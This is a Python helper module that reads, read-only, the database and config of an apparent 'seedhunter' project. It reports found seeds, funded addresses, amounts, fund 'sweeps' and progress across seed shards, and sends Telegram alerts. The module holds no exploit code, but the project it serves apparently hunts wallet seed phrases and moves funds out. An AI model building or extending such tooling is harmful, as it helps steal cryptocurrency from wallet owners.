"""Read-only bridge into the existing project.

Nothing here writes config.yaml, .env, data/hits.db or data/cursor.json. The only
optional write is Store.add() when mirroring. Every touch point is guarded.
"""
from __future__ import annotations

import json
import sqlite3
from contextlib import closing
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
HITS_DB = ROOT / "data" / "hits.db"
CURSOR = ROOT / "data" / "cursor.json"
OVERRIDES = ROOT / "data" / "overrides.json"


def _ro(db_path: Path) -> sqlite3.Connection:
    con = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True, timeout=5)
    con.row_factory = sqlite3.Row
    return con


def available() -> bool:
    return HITS_DB.exists()


def repo_config() -> dict:
    try:
        import yaml
        return yaml.safe_load((ROOT / "config.yaml").read_text()) or {}
    except Exception:
        return {}


def cursor() -> dict:
    try:
        return json.loads(CURSOR.read_text())
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


def overrides() -> dict:
    try:
        return json.loads(OVERRIDES.read_text())
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


def hit_count() -> int:
    if not available():
        return 0
    try:
        with closing(_ro(HITS_DB)) as con:
            return con.execute("SELECT COUNT(*) FROM hits").fetchone()[0]
    except sqlite3.Error:
        return 0


def recent_hits(limit: int = 25) -> list[dict]:
    if not available():
        return []
    try:
        with closing(_ro(HITS_DB)) as con:
            rows = con.execute(
                "SELECT ts,chain,address,seed,asset,amount,verdict,url FROM hits "
                "ORDER BY id DESC LIMIT ?", (max(1, min(limit, 200)),)).fetchall()
        return [{k: r[k] for k in r.keys()} for r in rows]
    except sqlite3.Error:
        return []


def sweeps(limit: int = 10) -> list[dict]:
    if not available():
        return []
    try:
        with closing(_ro(HITS_DB)) as con:
            rows = con.execute("SELECT ts,chain,address,asset,amount,tx,ok FROM sweeps "
                               "ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
        return [{k: r[k] for k in r.keys()} for r in rows]
    except sqlite3.Error:
        return []


def status() -> dict:
    cfg = repo_config()
    chains = cfg.get("chains") or {}
    cur = cursor()
    return {
        "attached": available(),
        "hits_db": "data/hits.db" if available() else None,
        "hits_total": hit_count(),
        "family": cur.get("family") or cfg.get("family"),
        "shard": cur.get("shard", cfg.get("shard")),
        "shards": cfg.get("shards"),
        "progress": cur.get("progress"),
        "seeds": cur.get("seeds"),
        "sweep_dry_run": (cfg.get("sweep") or {}).get("dry_run"),
        "sweep_enabled": (cfg.get("sweep") or {}).get("enabled"),
        "overrides": overrides(),
        "networks_enabled": sorted(k for k, v in chains.items()
                                   if isinstance(v, dict) and v.get("enabled")),
        "endpoint_counts": {k: len([e for e in (v.get("endpoints") or []) if e])
                            for k, v in chains.items() if isinstance(v, dict)},
    }


def mirror_store():
    try:
        from seedhunter.config import load
        from seedhunter.store import Store
        return Store(load().db_path)
    except Exception:
        return None


def notifier():
    try:
        import os
        from seedhunter.notifier import Notifier
        return Notifier(os.getenv("TELEGRAM_BOT_TOKEN"), os.getenv("TELEGRAM_CHAT_ID"))
    except Exception:
        return None


def write_heartbeat(path: Path, payload: dict) -> None:
    tmp = path.with_suffix(".tmp")
    tmp.write_text(json.dumps(payload))
    tmp.replace(path)